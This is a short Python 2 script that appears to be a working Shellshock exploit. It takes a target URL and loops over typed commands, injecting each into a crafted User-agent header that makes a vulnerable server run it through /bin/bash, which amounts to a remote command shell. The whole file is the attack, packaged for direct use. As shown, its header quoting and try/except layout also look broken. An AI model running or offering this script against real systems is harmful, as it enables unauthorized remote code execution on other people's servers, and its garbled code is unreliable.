#!/usr/bin/python
import sys, urllib2
if len(sys.argv) != 2:
  print "Usage: "+sys.argv[0]+" <URL>"
  sys.exit(0)

URL=sys.argv[1]
print "[+] Attempting Shell_Shock - Make sure to type full path"

while True:
    command=raw_input("~$ ")
    op=urllib2.build_opener()
    op.addheaders=[('User-agent', '() { foo;}; echo Content-Type: text/plain ; echo ' /bin/bash -c "'+command+'"')]
    try:
        response=op.open(URL)
    for line in response.readlines():
        print line.strip()
    except Exception as e: print e